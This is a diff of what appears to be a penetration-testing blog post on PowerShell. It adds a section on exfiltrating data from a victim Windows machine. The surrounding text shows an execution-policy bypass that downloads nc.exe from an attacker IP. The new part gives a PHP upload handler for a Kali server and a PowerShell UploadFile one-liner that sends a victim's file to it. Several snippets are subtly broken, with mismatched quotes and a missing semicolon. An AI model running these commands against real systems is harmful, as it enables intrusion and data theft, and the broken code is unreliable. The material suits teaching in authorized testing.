@@ -45,4 +45,32 @@ Along with PowerShell, remembe that there are sometimes restrictions placed onto
 powershell -c "-exec bypass mkdir c:\temp & Invoke-WebRequest -URI http://10.10.10.2/nc.exe -OUTFILE c:\temp\nc.exe"
 {% endhighlight %}
 
-<h1>Efiltrating Data<h2>
+<h1>Exfiltrating Data<h2>
+
+This is a method where you use a HTML server running on your Kali Linux attacking machine, where PowerShell can upload a file from a victim machine to your Kali. First, we will need to create a PHP page to process our upload request. This can be found here:
+
+{% highlight bash linenos %}
+<?php
+$uploaddir = '/var/www/uploads';
+$uploadfile = '$uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+{% endhighlight %}
+
+Also, make sure that the upload directory exists in your Kali Linux. Once saved adn created into our `/var/www/html` directory as `upload.php`, start and stop our local Apache processes:
+
+{% highlight bash linenos %}
+sudo service apache2 status
+/etc/init.d/apache2 start
+/etc/init.d/apache2 stop
+{% endhighlight %}
+
+And once running, call the PowerShell command to exfiltrate the data you require:
+
+{% highlight bash linenos %}
+powershell -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.10.1/upload.php, 'file.txt')"
+{% endhighlight %}
+
+And check your upload directory for the file!
+
+Thank you for reading, please keep coming back for more in this series as nanobyte learns and updates PowerShell For Penetration Testers!
